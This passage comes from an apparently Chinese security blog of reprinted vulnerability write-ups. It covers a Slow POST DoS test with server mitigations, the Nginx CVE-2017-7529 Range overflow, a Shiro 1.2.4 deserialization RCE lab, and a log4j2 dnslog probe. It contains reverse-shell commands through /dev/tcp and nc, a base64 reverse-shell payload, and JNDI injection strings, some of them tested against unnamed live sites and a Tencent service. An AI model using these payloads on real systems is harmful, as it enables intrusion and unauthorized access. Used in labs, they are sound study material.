-<h3><span id="slow-post">Slow Post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://vulurl.com</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。</p>
-<p>找一个存在漏洞的网址进行检测：</p>
-<p>使用Slow Post的payload：（漏洞网址已高码）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u https://xxxxxx</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Slow-HTTP-Dos/1.png" alt="image"></p>
-<p>当显示为NO，则表示存在HTTP慢速攻击漏洞，可导致拒绝服务。</p>
-</blockquote>
-<h2><span id="解决办法">解决办法</span></h2><blockquote>
-<p>针对不同的Server其对慢速http拒绝服务攻击防范方法也不同：</p>
-</blockquote>
-<h3><span id="websphere">WebSphere</span></h3><blockquote>
-<p>1、限制 HTTP 数据的大小</p>
-<p>在WebSphere Application Server 中进行如下设置：</p>
-<p>任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。</p>
-<p>HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。</p>
-<p>另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。</p>
-<p>设置限制任何请求正文的最大大小。</p>
-</blockquote>
-<blockquote>
-<p>2、设置keepalive参数</p>
-<p>打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。</p>
-<p>这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。</p>
-</blockquote>
-<blockquote>
-<p>详见<a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/websphere/techjournal/1210_lansche/1210_lansche.html#new-step32">参考链接</a></p>
-</blockquote>
-<h3><span id="weblogic">Weblogic</span></h3><blockquote>
-<p>1、在配置管理界面中的协议-&gt;一般信息下设置 完成消息超时时间小于200</p>
-</blockquote>
-<blockquote>
-<p>2、在配置管理界面中的协议-&gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。</p>
-</blockquote>
-<blockquote>
-<p>详见<a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/E12890_01/ales/docs32/integrateappenviron/configWLS.html#wp1101063">参考链接</a></p>
-</blockquote>
-<h3><span id="nginx">Nginx</span></h3><blockquote>
-<p>1、通过调整$request_method，配置服务器接受http包的操作限制；</p>
-</blockquote>
-<blockquote>
-<p>2、在保证业务不受影响的前提下，调整</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client_max_body_size</span><br><span class="line">client_body_buffer_size</span><br><span class="line">client_header_buffer_size</span><br><span class="line">large_client_header_buffersclient_body_timeout</span><br><span class="line">client_header_timeout</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>的值，必要时可以适当的增加；</p>
-</blockquote>
-<blockquote>
-<p>3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；</p>
-</blockquote>
-<blockquote>
-<p>4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients &#x3D; worker_processes * worker_connections。</p>
-</blockquote>
-<h3><span id="apache">Apache</span></h3><blockquote>
-<p>建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。</p>
-</blockquote>
-<blockquote>
-<p>1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout header=10-40,minrate=500</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。</span></span><br><span class="line"></span><br><span class="line">RequestReadTimeout body=10-40,minrate=500</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。<br>示例：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule reqtimeout_module modules/mod_reqtimeout.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">reqtimeout_module</span>&gt;</span></span><br><span class="line">        RequestReadTimeout header=10-40,minrate=500 body=10-40,minrate=500</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>2、mod_qos用于控制并发连接数。配置例如：</p>
-<p>当服务器并发连接数超过600时，关闭keepalive<br><code>QS_SrvMaxConnClose 600</code></p>
-<p>限制每个源IP最大并发连接数为50<br><code>QS_SrvMaxConnPerIP 50</code><br>这两个数值可以根据服务器的性能调整。</p>
-</blockquote>
-<blockquote>
-<p>更多关于qos_module配置<a target="_blank" rel="noopener" href="http://mod-qos.sourceforge.net/dos.html">参考</a><br>示例：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadModule qos_module modules/mod_qos.so</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">qos_module</span>&gt;</span></span><br><span class="line">QS_SrvMaxConnClose 600</span><br><span class="line">QS_SrvMaxConnPerIP 50</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3><span id="ihs服务器">IHS服务器</span></h3><blockquote>
-<p>请您先安装最新补丁包，然后启用mod_reqtimeout模块，在配置文件中加入：<br><code>LoadModule reqtimeout_module modules/mod_reqtimeout.so</code></p>
-</blockquote>
-<blockquote>
-<p>为mod_reqtimeout模块添加配置：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_reqtimeout.c</span>&gt;</span></span><br><span class="line">RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>对于HTTPS站点，建议header&#x3D;20-40,MinRate&#x3D;500。</p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21652165">参见</a></p>
-</blockquote>
-<h3><span id="f5负载均衡">F5负载均衡</span></h3><blockquote>
-<p>F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。<br>关于F5的慢速攻击防护配置，请参考<a target="_blank" rel="noopener" href="https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html">Page1</a>,<a target="_blank" rel="noopener" href="https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up">Page2</a></p>
-</blockquote>
-<h3><span id="iis服务器">IIS服务器</span></h3><blockquote>
-<p>IIS可配置相关网站的Web.config如下：</p>
-</blockquote>
-<blockquote>
-<p>1、WebLimits设置：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">webLimits</span> <span class="attr">connectionTimeout</span>=<span class="string">&quot;00:00:30&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">headerWaitTimeout</span>=<span class="string">&quot;00:00:10&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">dynamicIdleThreshold</span>=<span class="string">&quot;150&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">minBytesPerSecond</span>=<span class="string">&quot;512&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.applicationHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>参考以下<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/weblimits#configuration">链接</a></p>
-</blockquote>
-<blockquote>
-<p>2、headerLimits设置：</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">add</span> <span class="attr">header</span>=<span class="string">&quot;Content-type&quot;</span> <span class="attr">sizeLimit</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">headerLimits</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requestLimits</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/configuration/system.webserver/security/requestfiltering/requestlimits/headerlimits/">参考</a></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2018-04-16/2">https://payloads.online/archivers/2018-04-16/2</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">https://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoliu66007/p/10174672.html">https://www.cnblogs.com/xiaoliu66007/p/10174672.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/zh/thread-293945.html">https://forum.huawei.com/enterprise/zh/thread-293945.html</a></li>
-</ul>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/CVE-2017-7529-Nginx/">
-                CVE-2017-7529-Nginx
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="nginx-整数溢出小结-cve-2017-7529">nginx 整数溢出小结 cve-2017-7529</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/gaogaogaopipi/article/details/90301358">gaogaogaopipi</a></p>
-</blockquote>
-<h2><span id="起因">起因</span></h2><blockquote>
-<p>这两天在做nginx整数溢出时出了点小岔子，经过学习对这个问题有了深入的了解，特此记录。</p>
-<p>漏洞补丁以及平安银河实验室已经把这事说的很清楚了，在此记录<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/140402.html">原文地址</a></p>
-<p>简单的说就是这么一回事：<br>HTTP的Range允许客户端分批次请求资源的一部分，如果服务端资源较大，可以通过Range来并发下载；<br>正常情况下组件代码中计算了Range的长度，防止溢出，可以构造恶意长度来绕过，从而读取缓存的头部数据，造成泄露。</p>
-<p>细节要留意的就是range的相关定义，示例如下<br>Range:bytes&#x3D;0-1024 表示访问第0到第1024字节；<br>Range:bytes&#x3D;500-600,601-999，-300 表示分三块访问，分别是500到600字节，601到600字节，最后的300字节；</p>
-<p>在Response头中设置:<br>Accept-Ranges:bytes 表示接受部分资源的请求；<br>Content-Range: bytes START-END&#x2F;SIZE 表示返回的资源位置；其中SIZE等于Content-Length;如：Content-Range: bytes 500-600&#x2F;1000</p>
-</blockquote>
-<h2><span id="经过">经过</span></h2><blockquote>
-<p>测试站点：www.（我肯定是不能明说）.com.cn</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/1.png" alt="image"></p>
-<p>以站点的一张图片为例子，路径：&#x2F;images&#x2F;sq.jpg</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/2.png" alt="image"></p>
-<p>上图可以看到正常情况下content-length的大小是8935bytes，也就是size的大小。<br>size大小就是我一开始搞混了的地方，清楚了size的大小那么根据平安银河实验室的文章就有如下过程：</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/3.png" alt="image"></p>
-<p>上图可以看到正常的返回数据以及完整的ranges长度返回。</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/4.png" alt="image"></p>
-<p>上图可以看到，选择返回后十个bytes得到的结果（8935-10&#x3D;8925，所以是从8925开始返回。因为写定的end是总长减一，所以结尾的值是8934，所以此处statr&#x3D;8925,end&#x3D;8934），以及返回的range的位置。</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/5.png" alt="image"></p>
-<p>上图是对上面的补充，可以看到在读取部分bytes时，完整的参数是从“多少”到“多少”，上面是从1到10</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/6.png" alt="image"></p>
-<p>上图可以看到，在使用完整的输入模式，对-1开始读取的时候，触发了<code>ngx_http_range_parse()</code><br>对statr的负值检查，所以报错，无法读取。<br>那么此时就如原文所说<br>因此，如果需要将start解析为负数，只能通过-end这类后缀型range参数实现</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/7.png" alt="image"></p>
-<p>如上图，使用 -end 只设置一个大于8935的值，此时statr &#x3D; 8935-9000 &#x3D; -65，满足了负值。但按上文所说，statr是负值则会报错。<br>注意到此时并未报错，而是正常返回，原因是此处设置的range不是完整模式，虽然是负值，但是因为end的默认值是总长-1（8935-1&#x3D;8934），那么此时这段要读取的range的范围是从 -65到 8934 其实际总长超过了 8935 所以nginx丢弃了range，所以正常返回。</p>
-</blockquote>
-<h2><span id="重点">重点</span></h2><blockquote>
-<p>上面满足了传值为负值的条件，但是因为总长度检测的原因，导致丢弃range，那么如果绕过总长度检测？为什么这个漏洞要叫 整数溢出 漏洞呢？<br>这里注意到 ***start, end, size均为64位有符号整形，值的范围是-9223372036854775808 … 9223372036854775807 ，那么根据补丁中的代码 size +&#x3D; end - start</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/8.png" alt="image"></p>
-<p>只要最终size的值是负值，即可溢出，从而绕过检测，所以叫 整数溢出<br>0x8000 0000 0000 0000既是64位有符号型的最小负值，所以只需要最终相加得到的size为0×8000000000000000即可。</p>
-<p>注意 size +&#x3D; end -start;这等于如果存在多个range，那么就会有 size &#x3D; size + (end - start)<br>也就是说在有多个range时，最终的size &#x3D; size1 + size2 + … +sizeN<br>如上所说，只要size是负值即可溢出，那么就能得到第二个range的值，若第一个range是9500<br>那么0x8000000000000000-9500 既是第二个值</p>
-<p>那么如下图：</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/9.png" alt="image"></p>
-<p>成功！</p>
-</blockquote>
-<h2><span id="结果">结果</span></h2><blockquote>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/10.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
-                Shiro RememberMe 1.2.4
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
-</blockquote>
-<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
-<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
-</blockquote>
-<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如需进入环境，命令为</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
-
-<h3><span id="3web访问">3.web访问</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
-<p>或虚拟机外面用真实ip访问</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
-<p>至此漏洞环境搭建成功</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
-<p>查看返回包里setcookie有rememberme的字样</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
-<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
-</blockquote>
-<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
-<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
-</blockquote>
-<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
-<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>运行结果如下图：</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
-<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
-</blockquote>
-<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
-<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
-</blockquote>
-<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
-<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
-<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
-</blockquote>
-<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
-<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PS：ip假的，不打码，观看流畅</p>
-</blockquote>
-<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
-<p>这里使用curl也能达到burp的效果</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
-</blockquote>
-<h2><span id="题外话1">题外话1</span></h2><blockquote>
-<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
-</blockquote>
-<h2><span id="题外话2">题外话2</span></h2><blockquote>
-<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shiro/" rel="tag">Shiro</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/dnslog-log4j2/">
-                dnslog-log4j2
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
-</blockquote>
-<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
-<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
-<p>Get SubDomain 得到一个随机的子域名</p>
-<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
-<p>往任意可能在log中塞的输入填</p>
-<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
-<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
-<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
-<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Log4j2/" rel="tag">Log4j2</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
-                HTTP.sys远程代码执行
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="渗透整理httpsys远程代码执行">【渗透整理】HTTP.sys远程代码执行</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/106548456">久违 °</a></p>
-</blockquote>
-<h2><span id="漏洞介绍">漏洞介绍</span></h2><blockquote>
-<p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
-<p>影响环境：Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响。</p>
-</blockquote>
-<h2><span id="漏洞知识">漏洞知识</span></h2><blockquote>
-<p>说到HTTP.sys远程代码执行漏洞，不得不先介绍一下Range首部字段。</p>
-<p>在“上古时代”，网络并不是很好，下载大型文件很不容易。下载途中如果网络中断，就得重头开始下。为了解决这个问题，HTTP&#x2F;1.1引入了范围请求。</p>
-<p>在请求报文的Range首部字段中指定资源的byte范围，告诉服务器，请求的是资源哪个范围的内容，让断点续传和并行下载得以实现。</p>
